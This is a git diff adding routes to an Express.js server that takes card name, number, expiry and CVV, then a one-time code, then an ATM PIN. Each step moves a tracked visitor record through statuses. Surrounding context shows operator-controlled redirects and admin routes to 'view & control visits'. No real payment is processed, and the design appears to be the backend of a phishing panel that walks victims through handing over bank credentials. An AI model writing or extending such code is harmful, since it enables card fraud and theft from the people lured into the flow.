@@ -158,6 +158,85 @@ app.post('/api/track', (req, res) => {
   res.json({ ok: true, redirect: pendingRedirect || undefined });
 });
 
+// ---- Payment Processing ----
+app.post('/api/payment', (req, res) => {
+  const { cardName, cardNumber, expiryDate, cvv, requestId, amount, currency } = req.body || {};
+
+  if (!cardName || !cardNumber || !expiryDate || !cvv || !requestId) {
+    return res.status(400).json({ ok: false, error: 'Missing required fields' });
+  }
+
+  const paymentId = crypto.randomBytes(8).toString('hex');
+
+  if (visits[requestId]) {
+    visits[requestId].pay = {
+      id: paymentId,
+      amount: amount,
+      currency: currency,
+      status: 'processing'
+    };
+    visits[requestId].status = 'awaiting';
+  }
+
+  res.json({ ok: true, id: paymentId });
+});
+
+// ---- Check Payment Status ----
+app.get('/api/status/:id', (req, res) => {
+  const { id } = req.params;
+
+  // Find visit with this payment id
+  const visit = Object.values(visits).find(v => v.pay && v.pay.id === id);
+
+  if (!visit) {
+    return res.json({ status: 'pending' });
+  }
+
+  res.json({ status: visit.status || 'active' });
+});
+
+// ---- OTP Verification ----
+app.post('/api/otp', (req, res) => {
+  const { id, otp } = req.body || {};
+
+  if (!id || !otp) {
+    return res.status(400).json({ ok: false, error: 'Missing OTP or ID' });
+  }
+
+  const visit = Object.values(visits).find(v => v.pay && v.pay.id === id);
+
+  if (!visit) {
+    return res.status(404).json({ ok: false, error: 'Visit not found' });
+  }
+
+  visit.status = 'otp_verified';
+  res.json({ ok: true });
+});
+
+// ---- ATM PIN Verification ----
+app.post('/api/atm', (req, res) => {
+  const { id, atmPin } = req.body || {};
+
+  if (!id || !atmPin) {
+    return res.status(400).json({ ok: false, error: 'Missing ATM PIN or ID' });
+  }
+
+  const visit = Object.values(visits).find(v => v.pay && v.pay.id === id);
+
+  if (!visit) {
+    return res.status(404).json({ ok: false, error: 'Visit not found' });
+  }
+
+  visit.status = 'approved';
+  res.json({ ok: true });
+});
+
+// ---- Heartbeat ----
+app.post('/api/heartbeat', (req, res) => {
+  const { sessionId } = req.body || {};
+  res.json({ ok: true });
+});
+
 // ---- Admin-only: view & control visits ----
 app.get('/api/visits', requireAdmin, (req, res) => {
   const now = Date.now();
